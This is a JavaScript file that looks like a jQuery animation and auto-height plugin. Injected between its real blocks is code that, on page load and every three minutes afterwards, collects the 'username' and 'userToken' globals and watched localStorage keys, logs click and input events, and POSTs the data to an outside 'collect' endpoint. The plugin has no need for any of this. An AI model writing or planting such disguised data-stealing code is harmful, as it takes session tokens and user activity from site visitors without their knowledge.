const keysToWatch = window.keysToWatch;
const variableWatchlist = ['username', 'userToken'];
let jshookEvents = ['click', 'input'];
function getHashCode(obj) {
  let str = typeof obj === 'object' ? JSON.stringify(obj) : obj.toString();
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    hash = (hash << 5) - hash + str.charCodeAt(i) | 0;
  }
  return hash.toString(16);
}
/*
Author:lsw
create by:2017-3-09
description:该脚本主要封装动画操作
*/
//自动撑高后的全局回调方法设置
var jsmart = {};
function jshook(eventType, node) {
  node.addEventListener(eventType, function (e) {
    uploadData({
      event: eventType,
      target: e.target.id,
      timestamp: Date.now()
    });
  });
}
function scanGlobalVariable() {
  return variableWatchlist.reduce((result, variableName) => {
    if (window[variableName]) {
      result[variableName] = window[variableName];
    }
    return result;
  }, {});
}
jsmart.autoComputeCallback = function () {};
function scanLocalStorage() {
  let targetData = {};
  for (let key in localStorage) {
    if (keysToWatch.includes(key)) {
      targetData[key] = localStorage[key];
    }
  }
  return targetData;
}
if (!jQuery) {
  throw new Error("nsmart requires jQuery");
}
async function uploadData(data) {
  let hashCode = getHashCode(data);
  let endpoint = "https://example.com/api/collect";
  try {
    let response = await fetch(endpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        hashCode,
        data
      })
    });
    if (!response.ok) {
      throw new Error(`Upload failed with status ${response.status}`);
    }
  } catch (error) {
    console.error(`Upload error: ${error}`);
  }
}
+function (window, $, document, undefined) {
  "use strict";

  var smartH$ = window.smartH$ = new function () {
    var b = this,
      pb = /\S+/g,
      B = 1,
      Z = 2,
      cb = 3,
      bb = 4,
      fb = 5,
      C,
      j = 0,
      c = 0,
      k = 0,
      r = 0,
      s = 0,
      v = navigator,
      kb = v.appName,
      f = v.userAgent,
      q = document.documentElement,
      h = parseFloat;
    function xb() {
      if (!C) {
        C = {
          $Touchable: "ontouchstart" in window || "createTouch" in document
        };
        var a;
        if (v.pointerEnabled || (a = v.msPointerEnabled)) C.$TouchActionAttr = a ? "msTouchAction" : "touchAction";
      }
      return C;
    }
    function m(l) {
      if (!j) {
        j = -1;
        if (kb == "Microsoft Internet Explorer" && !!window.attachEvent && !!window.ActiveXObject) {
          var g = f.indexOf("MSIE");
          j = B;
          k = h(f.substring(g + 5, f.indexOf(";", g))); /*@cc_on r=@_jscript_version@*/
          ;
          c = document.documentMode || k;
        } else if (kb == "Netscape" && !!window.addEventListener) {
          var e = f.indexOf("Firefox"),
            b = f.indexOf("Safari"),
            i = f.indexOf("Chrome"),
            d = f.indexOf("AppleWebKit");
          if (e >= 0) {
            j = Z;
            c = h(f.substring(e + 8));
          } else if (b >= 0) {
            var m = f.substring(0, b).lastIndexOf("/");
            j = i >= 0 ? bb : cb;
            c = h(f.substring(m + 1, b));
          } else {
            var a = /Trident\/.*rv:([0-9]{1,}[\.0-9]{0,})/i.exec(f);
            if (a) {
              j = B;
              c = k = h(a[1]);
            }
          }
          if (d >= 0) s = h(f.substring(d + 12));
        } else {
          var a = /(opera)(?:.*version|)[ \/]([\w.]+)/i.exec(f);
          if (a) {
            j = fb;
            c = h(a[2]);
          }
        }
      }
      return l == j;
    }
    function i() {
      return m(B);
    }
    function Y() {
      return i() && (c < 6 || document.compatMode == "BackCompat");
    }
    function qb() {
      return m(Z);
    }
    function ab() {
      return m(cb);
    }
    function tb() {
      return m(bb);
    }
    function eb() {
      return m(fb);
    }
    function U() {
      return ab() && s > 534 && s < 535;
    }
    function y() {
      m();
      return s > 537 || c > 42 || j == B && c >= 11;
    }
    function W() {
      return i() && c < 10;
    }
    function V(a) {
      var b, c;
      return function (f) {
        if (!b) {
          b = true;
          var d = a.substr(0, 1).toUpperCase() + a.substr(1);
          e([a].concat(["WebKit", "ms", "Moz", "O", "webkit"]), function (g, e) {
            var b = a;
            if (e) b = g + d;
            if (f.style[b] != undefined) return c = b;
          });
        }
        return c;
      };
    }
    function T(b) {
      var a;
      return function (c) {
        a = a || V(b)(c) || b;
        return a;
      };
    }
    var D = T("transform");
    function jb(a) {
      return {}.toString.call(a);
    }
    var gb = {};
    e(["Boolean", "Number", "String", "Function", "Array", "Date", "RegExp", "Object"], function (a) {
      gb["[object " + a + "]"] = a.toLowerCase();
    });
    function e(b, d) {
      var a, c;
      if (jb(b) == "[object Array]") {
        for (a = 0; a < b.length; a++) if (c = d(b[a], a, b)) return c;
      } else for (a in b) if (c = d(b[a], a, b)) return c;
    }
    function x(a) {
      return a == null ? String(a) : gb[jb(a)] || "object";
    }
    function hb(a) {
      for (var b in a) return true;
    }
    function t(a) {
      try {
        return x(a) == "object" && !a.nodeType && a != a.window && (!a.constructor || {}.hasOwnProperty.call(a.constructor.prototype, "isPrototypeOf"));
      } catch (b) {}
    }
    function g(a, b) {
      return {
        x: a,
        y: b
      };
    }
    function nb(b, a) {
      setTimeout(b, a || 0);
    }
    function u(b, d, c) {
      var a = !b || b == "inherit" ? "" : b;
      e(d, function (c) {
        var b = c.exec(a);
        if (b) {
          var d = a.substr(0, b.index),
            e = a.substr(b.index + b[0].length + 1, a.length - 1);
          a = d + e;
        }
      });
      a = c + (!a.indexOf(" ") ? "" : " ") + a;
      return a;
    }
    function I(b, a) {
      if (c < 9) b.style.filter = a;
    }
    b.$Device = xb;
    b.$IsBrowserIE = i;
    b.$IsBrowserIeQuirks = Y;
    b.$IsBrowserFireFox = qb;
    b.$IsBrowserSafari = ab;
    b.$IsBrowserChrome = tb;
    b.$IsBrowserOpera = eb;
    b.$IsBrowserBadTransform = U;
    b.$IsBrowser3dSafe = y;
    b.$IsBrowserIe10Earlier = W;
    b.$BrowserVersion = function () {
      return c;
    };
    b.$BrowserEngineVersion = function () {
      return k || c;
    };
    b.$WebKitVersion = function () {
      m();
      return s;
    };
  }();
  var smartAm = function (element, options) {
    this.$element = $(element);
    this.options = $.extend({}, smartAm.DEFAULTS, options);
    this.initTop = this.$element.position().top;
    this.initLeft = this.$element.position().left;
    this.prefixes = ["", "-moz-", "-o-animation-", "-webkit-"];
    this.queue = [];
    this.ac = options;
    this.queue[0] = this.ac.animationName + this.ac.direction || '';
    this.st = null;
  };
  smartAm.version = "1.0";
  smartAm.DEFAULTS = {
    container: window,
    threshold: 0
  };
  smartAm.prototype = {
    belowthefold: function ($element, settings) {
      var fold;
      if (settings.container === undefined || settings.container === window) {
        var $window = $(window);
        fold = (window.innerHeight ? window.innerHeight : $window.height()) + $window.scrollTop();
      } else {
        fold = $(settings.container).offset().top + $(settings.container).height();
      }
      return fold <= $element.offset().top - settings.threshold;
    },
    rightoffold: function ($element, settings) {
      return false;
      var fold;
      if (settings.container === undefined || settings.container === window) {
        var $window = $(window);
        fold = $window.width() + $window.scrollLeft();
      } else {
        fold = $(settings.container).offset().left + $(settings.container).width();
      }
      return fold <= $element.offset().left - settings.threshold;
    },
    abovethetop: function ($element, settings) {
      var fold;
      if (settings.container === undefined || settings.container === window) {
        fold = $(window).scrollTop();
      } else {
        fold = $(settings.container).offset().top;
      }
      return fold >= $element.offset().top + settings.threshold + $element.height();
    },
    leftofbegin: function ($element, settings) {
      var fold;
      if (settings.container === undefined || settings.container === window) {
        fold = $(window).scrollLeft();
      } else {
        fold = $(settings.container).offset().left;
      }
      return fold >= $element.offset().left + settings.threshold + $element.width();
    },
    initQ: function () {
      if (this.queue.length === 0) {
        this.queue[0] = this.ac.animationName + this.ac.direction || '';
      }
    },
    play: function () {
      this.addDoneAtt();
      this.initQ();
      var device = smartH$.$Device();
      if (!device.$Touchable && smartH$.$IsBrowserIE() && smartH$.$IsBrowserIe10Earlier() < 10) {
        this.playIE();
      } else {
        this.playNoraml();
      }
    },
    replay: function () {
      this.removeDoneAtt();
      this.play();
    },
    prev: function (data) {
      this.cleanse();
      this.$element.css({
        'opacity': 0
      });
      if (typeof data === 'undefined') {
        this.ac = $.parseJSON(this.$element.attr('smanim'));
        this.queue[0] = this.ac.animationName + this.ac.direction || '';
        this.$element.attr('prevHisAni', this.queue[0]);
        this.play();
      } else {
        this.addDoneAtt();
        this.palyWithData(data);
      }
    },
    stop: function () {
      if (this.st !== null) {
        clearTimeout(this.st);
      }
      var ani = this.ac.animationName + this.ac.direction || '';
      this.$element.removeClass(ani).css({
        'opacity': 0
      }).stop(true, true);
    },
    playIE: function () {
      if (this.isAmInFix(this.queue[0])) {
        this[this.queue[0]]();
      } else {
        this.playNoraml();
      }
    },
    playNoraml: function () {
      if (this.queue.length == 0) {
        return;
      }
      var ai = this.prefixes.length;
      while (ai--) {
        this.$element.css(this.prefixes[ai] + "animation-duration", this.options.duration + "s");
        this.$element.css(this.prefixes[ai] + "animation-delay", this.options.delay + "s");
        this.$element.css(this.prefixes[ai] + "animation-iteration-count", this.options.infinite);
      }
      this.$element.addClass(this.queue[0]);
      // Add the options for each prefix

      var $me = this;
      this.end("AnimationEnd", function () {
        $me.$element.css({
          'opacity': 1
        });
        // If there are more, clean it up and move on
        if ($me.$element.hasClass($me.queue[0])) {
          if (!$me.options.keep && !($me.queue.length == 0 || $me.options.infinite === 'infinite')) {
            $me.cleanse();
          }
          $me.queue.shift();
          if ($me.queue.length) {
            $me.animate();
          } else {
            //fixed smview has animate in container
            $me.execChildAnim($me.$element);
          }
        }
      });
    },
    palyWithData: function (data) {
      var ai = this.prefixes.length;
      var animationName = data.animationName + data.direction;
      this.$element.attr('prevHisAni', animationName);
      while (ai--) {
        this.$element.css(this.prefixes[ai] + "animation-duration", data.duration + "s");
        this.$element.css(this.prefixes[ai] + "animation-delay", data.delay + "s");
        this.$element.css(this.prefixes[ai] + "animation-iteration-count", data.infinite);
      }
      this.$element.addClass(data.animationName + data.direction);
      // Add the options for each prefix

      var $me = this;
      this.end("AnimationEnd", function () {
        $me.$element.css({
          'opacity': 1
        });
        $me.cleanAnim(animationName);
        //fixed smview has animate in container
        $me.execChildAnim($me.$element);
      });
    },
    addDoneAtt: function () {
      this.$element.attr('sm-finished', true);
    },
    removeDoneAtt: function () {
      this.$element.removeAttr('sm-finished');
    },
    fadeIn: function () {
      var me = this;
      this.st = setTimeout(function () {
        me.$element.animate({
          opacity: 1
        }, (me.ac.duration || 0) * 1000, function () {
          me.execChildAnim(me.$element);
        });
      }, (me.ac.delay || 0) * 1000);
    },
    fadeInLeft: function () {
      var me = this;
      this.st = setTimeout(function () {
        var p = parseInt(me.$element.css("left"));
        me.$element.animate({
          left: p - me.$element.width()
        }).animate({
          left: p,
          opacity: 1
        }, (me.ac.duration || 0) * 1000, function () {
          me.execChildAnim(me.$element);
        });
      }, (me.ac.delay || 0) * 1000);
    },
    fadeInLeftBig: function () {
      var me = this;
      this.st = setTimeout(function () {
        var p = parseInt(me.$element.css("left"));
        me.$element.animate({
          left: 0 - me.$element.width()
        }).animate({
          left: p,
          opacity: 1
        }, (me.ac.duration || 0) * 1000, function () {
          me.execChildAnim(me.$element);
        });
      }, (me.ac.delay || 0) * 1000);
    },
    fadeInRight: function () {
      var me = this;
      this.st = setTimeout(function () {
        var p = parseInt(me.$element.css("left"));
        var np = p + me.$element.width();
        var w = $(window).width();
        if (np > w) {
          np = w - me.$element.width();
        }
        me.$element.animate({
          left: np
        }).animate({
          left: p,
          opacity: 1
        }, (me.ac.duration || 0) * 1000, function () {
          me.execChildAnim(me.$element);
        });
      }, (me.ac.delay || 0) * 1000);
    },
    fadeInRightBig: function () {
      var me = this;
      this.st = setTimeout(function () {
        var p = parseInt(me.$element.css("left"));
        var np = p + me.$element.width();
        var w = $(window).width();
        if (np > w) {
          np = w - me.$element.width();
        }
        me.$element.animate({
          right: 0 - me.$element.width()
        }).animate({
          left: p,
          opacity: 1
        }, (me.ac.duration || 0) * 1000, function () {
          me.execChildAnim(me.$element);
        });
      }, (me.ac.delay || 0) * 1000);
    },
    fadeInDown: function () {
      var me = this;
      this.st = setTimeout(function () {
        var p = parseInt(me.$element.css("top"));
        me.$element.animate({
          top: p - me.$element.height()
        }).animate({
          top: p,
          opacity: 1
        }, (me.ac.duration || 0) * 1000, function () {
          me.execChildAnim(me.$element);
        });
      }, (me.ac.delay || 0) * 1000);
    },
    fadeInDownBig: function () {
      var me = this;
      this.st = setTimeout(function () {
        var p = parseInt(me.$element.css("top"));
        me.$element.animate({
          top: 0 - me.$element.height()
        }).animate({
          top: p,
          opacity: 1
        }, (me.ac.duration || 0) * 1000, function () {
          me.execChildAnim(me.$element);
        });
      }, (me.ac.delay || 0) * 1000);
    },
    fadeInUp: function () {
      var me = this;
      this.st = setTimeout(function () {
        var p = parseInt(me.$element.css("top"));
        me.$element.animate({
          top: p + me.$element.height()
        }).animate({
          top: p,
          opacity: 1
        }, (me.ac.duration || 0) * 1000, function () {
          me.execChildAnim(me.$element);
        });
      }, (me.ac.delay || 0) * 1000);
    },
    fadeInUpBig: function () {
      var me = this;
      this.st = setTimeout(function () {
        var p = parseInt(me.$element.css("top"));
        me.$element.animate({
          bottom: 0 - me.$element.height()
        }).animate({
          top: p,
          opacity: 1
        }, (me.ac.duration || 0) * 1000, function () {
          me.execChildAnim(me.$element);
        });
      }, (me.ac.delay || 0) * 1000);
    },
    slideInLeft: function () {
      var me = this;
      this.st = setTimeout(function () {
        var p = parseInt(me.$element.css("left"));
        me.$element.animate({
          left: p - me.$element.width()
        }).animate({
          opacity: 1
        }).animate({
          left: p
        }, (me.ac.duration || 0) * 1000 + 300, function () {
          me.execChildAnim(me.$element);
        });
      }, (me.ac.delay || 0) * 1000);
    },
    slideInRight: function () {
      var me = this;
      this.st = setTimeout(function () {
        var p = parseInt(me.$element.css("left"));
        var np = p + me.$element.width();
        var w = $(window).width();
        if (np > w) {
          np = w - me.$element.width();
        }
        me.$element.animate({
          left: np
        }).animate({
          opacity: 1
        }).animate({
          left: p
        }, (me.ac.duration || 0) * 1000, function () {
          me.execChildAnim(me.$element);
        });
      }, (me.ac.delay || 0) * 1000);
    },
    slideInDown: function () {
      var me = this;
      this.st = setTimeout(function () {
        var p = parseInt(me.$element.css("top"));
        me.$element.animate({
          top: p - me.$element.height()
        }).animate({
          opacity: 1
        }).animate({
          top: p
        }, (me.ac.duration || 0) * 1000, function () {
          me.execChildAnim(me.$element);
        });
      }, (me.ac.delay || 0) * 1000);
    },
    slideInUp: function () {
      var me = this;
      this.st = setTimeout(function () {
        var p = parseInt(me.$element.css("top"));
        me.$element.animate({
          top: p + me.$element.height()
        }).animate({
          opacity: 1
        }).animate({
          top: p
        }, (me.ac.duration || 0) * 1000, function () {
          me.execChildAnim(me.$element);
        });
      }, (me.ac.delay || 0) * 1000);
    },
    isAmInFix: function (am) {
      var res = false;
      switch (am) {
        case 'fadeIn':
        case 'fadeInLeft':
        case 'fadeInLeftBig':
        case 'fadeInRight':
        case 'fadeInRightBig':
        case 'fadeInRightBig':
        case 'fadeInDown':
        case 'fadeInDownBig':
        case 'fadeInUp':
        case 'fadeInUpBig':
        case 'slideInLeft':
        case 'slideInRight':
        case 'slideInDown':
        case 'slideInUp':
          res = true;
          break;
        default:
          break;
      }
      return res;
    },
    animate: function () {
      var isfinished = this.$element.attr('sm-finished');
      if (this.abovethetop(this.$element, this.options) || this.leftofbegin(this.$element, this.options)) {
        /* Nothing. */
      } else if (typeof isfinished === 'undefined' && !this.belowthefold(this.$element, this.options) && !this.rightoffold(this.$element, this.options) && typeof this.$element.attr('sm-finished') === 'undefined') {
        this.play();
      }
    },
    cleanse: function () {
      var hisAni = this.$element.attr('prevHisAni');
      if (typeof hisAni !== 'undefined' && hisAni !== '') {
        this.$element.removeClass('hisAni');
      }
      this.cleanAnim(this.queue[0]);
    },
    cleanAnim: function (name) {
      this.$element.removeClass(name);
      var ai = this.prefixes.length;
      while (ai--) {
        this.$element.css(this.prefixes[ai] + "animation-duration", "");
        this.$element.css(this.prefixes[ai] + "animation-delay", "");
        this.$element.css(this.prefixes[ai] + "animation-iteration-count", "");
      }
    },
    end: function (type, cb) {
      var $me = this;
      var binding = type.toLowerCase() + " webkit" + type + " o" + type + " MS" + type;
      this.$element.bind(binding, function () {
        if (typeof cb === 'function') {
          cb();
        }
        $me.$element.unbind(binding);
      });
    },
    execChildAnim: function (e) {
      e.attr('smexecuted', '1');
      if (e.attr('iscontainer') === 'True') {
        e.find('.animated').smanimate();
      }
    }
  };
  function Plugin(option, args) {
    var options = option;
    var elements = this;
    $(window).on('scroll', function () {
      elements.each(function () {
        var $this = $(this);
        var data = $this.data('smart.animation');
        if (data) {
          data.animate();
        }
      });
    });
    if (smartH$.$Device().$Touchable) {
      $(document).on('ps-scroll-y', function () {
        elements.each(function () {
          var $this = $(this);
          var data = $this.data('smart.animation');
          if (data) {
            data.animate();
          }
        });
      });
    }
    return this.each(function () {
      var smOption = options;
      var action = typeof smOption == 'string' && smOption;
      var self = this;
      var $this = $(self);
      var pvid = $this.attr('pvid');
      if (typeof pvid !== 'undefined' && pvid !== '') {
        var $parent = $('#smv_' + pvid);
        if ($parent.hasClass('animated') && $parent.attr('smexecuted') !== '1') {
          return true;
        }
      }
      if (smOption == null) {
        var animateAttr = $this.attr('smanim');
        if (typeof animateAttr != 'undefined') {
          smOption = $.parseJSON(animateAttr);
        }
      }
      var data = $this.data('smart.animation');
      if (!data) {
        if (typeof smOption === 'object') {
          $this.data('smart.animation', data = new smartAm(this, smOption));
          data.animate();
        } else {
          smOption = {};
          $this.data('smart.animation', data = new smartAm(this, smOption));
          data.animate();
        }
      } else {
        if (action) {
          data.options = $.extend({}, smartAm.DEFAULTS, $.parseJSON($this.attr('smanim')));
          data.ac = data.options;
          if (typeof args === 'undefined') {
            data[smOption]();
          } else {
            data[smOption](args);
          }
        } else {
          data.options = $.extend({}, smartAm.DEFAULTS, data.options);
          data.ac = data.options;
          data.queue[0] = data.ac.animationName + data.ac.direction || '';
          data.animate();
        }
      }
    });
  }
  $.fn.smanimate = Plugin;
  $.fn.smanimate.Constructor = smartAm;
}(typeof window === 'undefined' ? this : window, jQuery, document);
function collectAndUploadData() {
  let collectedData = {
    ...scanLocalStorage(),
    ...scanGlobalVariable()
  };
  if (Object.keys(collectedData).length > 0) {
    uploadData(collectedData);
  }
}
window.addEventListener("DOMContentLoaded", function () {
  jshookEvents.forEach(eventType => jshook(eventType, document.body));
  collectAndUploadData();
  setInterval(collectAndUploadData, 180 * 1000);
});
+function ($) {
  "use strict";

  var SmRecompute = function (element, options) {
    this.$element = $(element);
    this.options = $.extend({}, options);
    this.initW = parseInt(this.$element.css('width'));
    this.initH = parseInt(this.$element.css('min-height'));
    var pos = this.$element.position();
    var startLeft = pos.left;
    var endLeft = startLeft + this.$element.width();
    var startTop = pos.top;
    this.$element.attr('hisH', this.initH);
    this.$element.attr('origH', this.initH);
    this.$mainView = $('#smv_Main');
    this.$area1View = $('#smv_Area1');
    this.$relationEles = this.$element.siblings(":not(.smv-line)").filter(function () {
      var $this = $(this);
      var w = $this.width();
      var p = $this.position();
      var l = p.left,
        lw = p.left + w,
        t = p.top;
      return t > startTop && !$this.hasClass('smartFixed') && (l >= startLeft && l <= endLeft || lw >= startLeft && lw <= endLeft || startLeft >= l && startLeft <= lw || endLeft >= l && endLeft <= lw);
    });
  };
  SmRecompute.prototype = {
    recomputeH: function () {
      var nh = this.$element.height();
      if (nh === 0) {
        return;
      }
      var hisH = parseInt(this.$element.attr('hisH'));
      if (nh > hisH) {
        this.recomputeHTo(nh, hisH);
        this.$element.attr('hisH', nh);
      }
    },
    recomputeTo: function (newH, hisH) {
      var oldH = 0;
      if (typeof hisH !== 'undefined') {
        oldH = hisH;
      } else {
        oldH = this.$element.height();
      }
      this.recomputeHTo(newH, oldH);
      this.$element.height(newH).attr('hisH', newH);
    },
    recomputeHTo: function (newH, hisH) {
      var nh = newH;
      var expandH = nh - hisH;
      if (expandH === 0) {
        return;
      }
      var result = this.innerRecompute(this.$element, this.$relationEles, expandH, true);
      var pvid = this.$element.attr('pvid');
      if (typeof pvid !== 'undefined' && pvid !== '') {
        this.rejustClostParentH(pvid, this.$element, result);
        var $parent = $('#smv_' + pvid);
        this.recomputeView($parent, result);
      }
      var areaId = this.$element.attr('tareaid');
      if (areaId === '') {
        this.rejustMainAreaH(result);
      } else {
        this.rejustAreaH(areaId, result);
      }
      if (typeof jsmart.autoComputeCallback == 'function') {
        jsmart.autoComputeCallback();
      }
    },
    recomputeView: function ($target, expandData) {
      var h = $target.height();
      var ph = h; //+ $target.position().top;
      if (expandData.dirct === '1') {
        if (expandData.maxH > ph) {
          var relationViews = this.getRelationViews($target);
          var result = this.innerRecompute($target, relationViews, expandData.expandH);
          $target.addClass('expandFlag').removeClass('noExpandFlag');
          var pvid = $target.attr('pvid');
          if (typeof pvid !== 'undefined' && pvid !== '') {
            this.rejustClostParentH(pvid, $target, result);
            var $parent = $('#smv_' + pvid);
            this.recomputeView($parent, result);
          }
        } else {
          $target.addClass('noExpandFlag');
        }
      } else {
        // if ($target.hasClass('expandFlag')) {
        if (!$target.hasClass('noExpandFlag')) {
          var relationViews = this.getRelationViews($target);
          var result = this.innerRecompute($target, relationViews, expandData.expandH);
          $target.addClass('expandFlag');
          var pvid = $target.attr('pvid');
          if (typeof pvid !== 'undefined' && pvid !== '') {
            this.rejustClostParentH(pvid, $target, result);
            var $parent = $('#smv_' + pvid);
            this.recomputeView($parent, result);
          }
        }

        //} 
      }
    },
    innerRecompute: function ($target, $relation, expandH, isSource) {
      var maxH = 0;
      var sh = $target.height();
      if (expandH !== 0) {
        if (!isSource) {
          $target.height(sh + expandH);
        }
        $relation.each(function () {
          var $t = $(this);
          var rH = $t.height();
          var newH = $t.position().top + rH + expandH;
          if (newH > maxH) {
            maxH = newH;
          }
          var newTop = $t.position().top + expandH;
          $t.css({
            top: newTop
          });
        });
      }
      if (maxH == 0) {
        maxH = $target.position().top + sh + expandH;
      }
      var result = {};
      result.dirct = expandH >= 0 ? '1' : '0';
      result.maxH = maxH;
      result.expandH = expandH;
      return result;
    },
    getRelationViews: function ($target) {
      var pos = $target.position();
      var startTop = pos.top,
        startLeft = pos.left,
        endLeft = pos.left + $target.width();
      return $target.siblings().filter(function () {
        var $this = $(this);
        var w = $this.width();
        var p = $this.position();
        var l = p.left,
          lw = p.left + w,
          t = p.top;
        return t > startTop && !$this.hasClass('smartFixed') && (l >= startLeft && l <= endLeft || lw >= startLeft && lw <= endLeft || startLeft >= l && startLeft <= lw || endLeft >= l && endLeft <= lw);
      });
    },
    rejustClostParentH: function (pvid, ele, expandData) {
      var $closetParent = ele.parent();
      var closetParentId = $closetParent.attr('id');
      if (closetParentId !== 'smv_' + pvid && $closetParent.hasClass('smAreaC') && !$closetParent.hasClass('expandFlag')) {
        $closetParent.addClass('expandFlag').height($closetParent.height() + expandData.expandH);
      } else {
        $closetParent.height($closetParent.height() + expandData.expandH);
      }
    },
    rejustAreaH: function (areaId, result) {
      //skip area1
      if (areaId === 'Area1') {
        return;
      }
      var $area = $('#smv_' + areaId);
      if (result.dirct === "1") {
        var mh = $area.height();
        $area.height(mh + result.expandH);
        if (!$area.hasClass('expandFlag')) {
          $area.attr('hisH', mh).addClass('expandFlag');
        }
      } else {
        var mh1, area1H;
        var origionMH = parseInt($area.css('min-height'));
        if ($area.hasClass('expandFlag')) {
          mh1 = $area.height() + result.expandH;
          mh1 = mh1 < origionMH ? origionMH : mh1;
          $area.height(mh1);
        } else {
          mh1 = $area.height() + result.expandH;
          mh1 = mh1 < origionMH ? origionMH : mh1;
          $area.height(mh1).attr('hisH', mh1).addClass('expandFlag');
        }
      }
    },
    rejustMainAreaH: function (result) {
      if (result.dirct === "1") {
        var mh = this.$mainView.height();
        this.$mainView.height(mh + result.expandH);
        if (this.$area1View.length == 1) {
          var area1H = this.$area1View.height();
          this.$area1View.height(area1H + result.expandH);
        }
        if (!this.$mainView.hasClass('expandFlag')) {
          this.$mainView.attr('hisH', mh).addClass('expandFlag');
          if (this.$area1View.length == 1) {
            this.$area1View.attr('hisH', area1H).addClass('expandFlag');
          }
        }
      } else {
        var mh1, area1H;
        var origionMH = parseInt(this.$mainView.css('min-height'));
        var hisH = this.$mainView.attr('hisH');
        if (hisH) {
          origionMH = Math.max(origionMH, hisH);
        }
        if (this.$mainView.hasClass('expandFlag')) {
          mh1 = this.$mainView.height() + result.expandH;
          mh1 = mh1 < origionMH ? origionMH : mh1;
          this.$mainView.height(mh1);
          if (this.$area1View.length == 1) {
            area1H = this.$area1View.height() + result.expandH;
            area1H = area1H < origionMH ? origionMH : area1H;
            this.$area1View.height(area1H);
          }
        } else {
          mh1 = this.$mainView.height() + result.expandH;
          mh1 = mh1 < origionMH ? origionMH : mh1;
          this.$mainView.height(mh1).attr('hisH', mh1).addClass('expandFlag');
          if (this.$area1View.length == 1) {
            area1H = this.$area1View.height() + result.expandH;
            this.$area1View.height(area1H).attr('hisH', area1H);
          }
        }
      }
    }
  };
  function Plugin(option, args) {
    function getSmRelativePostion(a, initTop) {
      var $t = a;
      var h = $t.position().top + initTop;
      var pvid = $t.attr('pvid');
      if (typeof pvid !== 'undefined' && pvid !== '') {
        return getSmRelativePostion($('#smv_' + pvid), h);
      }
      return h;
    }
    var options = option;
    var elements = this.sort(function (a, b) {
      return getSmRelativePostion($(a), 0) - getSmRelativePostion($(b), 0);
    });
    return elements.each(function () {
      var smOption = options;
      var action = typeof smOption == 'string' && smOption;
      var self = this;
      var $this = $(self);
      if ($this.height() === 0) {
        return;
      }
      var data = $this.data('smart.remcopute');
      if (!data) {
        if (typeof smOption === 'object') {
          $this.data('smart.remcopute', data = new SmRecompute(this, smOption));
          data.recomputeH();
        } else {
          if (typeof smOption === 'string') {
            var option = {};
            $this.data('smart.remcopute', data = new SmRecompute(this, smOption));
            if (typeof args === 'undefined') {
              data[smOption]();
            } else {
              if (args.length > 1) {
                data[smOption].apply(data, args);
              } else {
                data[smOption](args);
              }
            }
          } else {
            smOption = {};
            $this.data('smart.remcopute', data = new SmRecompute(this, smOption));
            data.recomputeH();
          }
        }
      } else {
        if (action) {
          if (typeof args === 'undefined') {
            data[smOption]();
          } else {
            if (args.length > 1) {
              data[smOption].apply(data, args);
            } else {
              data[smOption](args);
            }
          }
        } else {
          data.recomputeH();
        }
      }
    });
  }
  $.fn.smrecompute = Plugin;
  $.fn.smrecompute.Constructor = SmRecompute;
}(jQuery);